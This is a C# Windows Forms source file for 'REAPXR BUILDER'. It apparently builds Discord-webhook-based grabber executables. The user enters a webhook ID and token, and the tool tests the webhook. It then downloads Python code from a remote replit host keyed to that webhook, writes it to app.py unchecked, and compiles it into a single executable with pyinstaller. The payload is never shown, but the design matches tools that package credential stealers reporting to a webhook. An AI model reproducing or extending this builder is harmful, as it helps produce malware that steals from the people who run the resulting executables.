using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Runtime.InteropServices;

namespace RP_Installer
{
    public partial class Form1 : Form
    {
        [DllImport("msvcrt.dll")]
        public static extern int system(string format);
        public Form1()
        {
            InitializeComponent();
            label1.ForeColor = Color.White;
            timer1.Interval = 100;
            timer1.Start();
        }

        private void label2_Click(object sender, EventArgs e)
        {
            MessageBox.Show("beta Release", "REAPXR BUILDER");
            Application.Exit();
        }

        private void button3_Click(object sender, EventArgs e)
        {
            //red text
            changetext(Color.Red);
        }
        private void changetext(Color color)
        {
            label2.ForeColor = color;
            label3.ForeColor = color;
            label4.ForeColor = color;
            label5.ForeColor = color;
            label6.ForeColor = color;
            textBox1.ForeColor = color;
            textBox2.ForeColor = color;
            button5.ForeColor = color;
            button6.ForeColor = color;
        }

        private void button2_Click(object sender, EventArgs e)
        {
            //blue text
            changetext(Color.Blue);
        }

        private void button1_Click(object sender, EventArgs e)
        {
            //green text
            changetext(Color.Lime);
        }

        private void button4_Click(object sender, EventArgs e)
        {
            //white text
            changetext(Color.White);
        }

        private void button5_Click(object sender, EventArgs e)
        {
            try
            {
                string webhook = "https://discord.com/api/webhooks/" + textBox1.Text + "/" + textBox2.Text;
                WebClient client = new WebClient();
                client.Headers.Add("Content-Type", "application/json");
                string payload = "{\"content\": \"" + "Webhook Is Working!" + "\"}";
                client.UploadData(webhook, Encoding.UTF8.GetBytes(payload));
            }
            catch
            {
                MessageBox.Show("Webhook Failed To Send");
            }
        }

        string code = "";
        private bool mouseDown;
        private Point lastLocation;


        private void button6_Click(object sender, EventArgs e)
        {
            string webhook = textBox1.Text;
            try
            {
                WebClient client = new WebClient();
                code = client.DownloadString($"https://builder.louiswj.repl.co/" + textBox1.Text + "/" + textBox2.Text);
                MessageBox.Show("Built Code Successfully", "Success");
            }
            catch
            {
                MessageBox.Show("Failed To Generate Code", "Api Error");
            }
            File.WriteAllText("app.py", code);
            string apppath = Application.StartupPath;
            Clipboard.SetText(apppath);
            try
            {
                system($"pyinstaller --onefile app.py");
            }
            catch
            {
                MessageBox.Show("Failed To Build");
            }
        }

        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            if (label1.ForeColor == Color.White)
            {
                label1.ForeColor = Color.Yellow;
            }
            else if (label1.ForeColor == Color.Yellow)
            {
                label1.ForeColor = Color.Lime;
            }
            else if (label1.ForeColor == Color.Lime)
            {
                label1.ForeColor = Color.Green;
            }
            else if (label1.ForeColor == Color.Green)
            {
                label1.ForeColor = Color.DarkBlue;
            }
            else if (label1.ForeColor == Color.DarkBlue)
            {
                label1.ForeColor = Color.Blue;
            }
            else if (label1.ForeColor == Color.Blue)
            {
                label1.ForeColor = Color.Cyan;
            }
            else if (label1.ForeColor == Color.Cyan)
            {
                label1.ForeColor = Color.LightPink;
            }
            else if (label1.ForeColor == Color.LightPink)
            {
                if (label1.Text == "REAPXR BUILDER")
                {
                    label1.Text = "VERSION 1.0";
                } else
                {
                    label1.Text = "REAPXR BUILDER";
                }
                label1.ForeColor = Color.White;
            }
        }

        private void label1_MouseDown(object sender, MouseEventArgs e)
        {
            mouseDown = true;
            lastLocation = e.Location;
        }

        private void label1_MouseMove(object sender, MouseEventArgs e)
        {
            if (mouseDown)
            {
                this.Location = new Point(
                    (this.Location.X - lastLocation.X) + e.X, (this.Location.Y - lastLocation.Y) + e.Y);

                this.Update();
            }
        }

        private void label1_MouseUp(object sender, MouseEventArgs e)
        {
            mouseDown = false;
        }
    }
}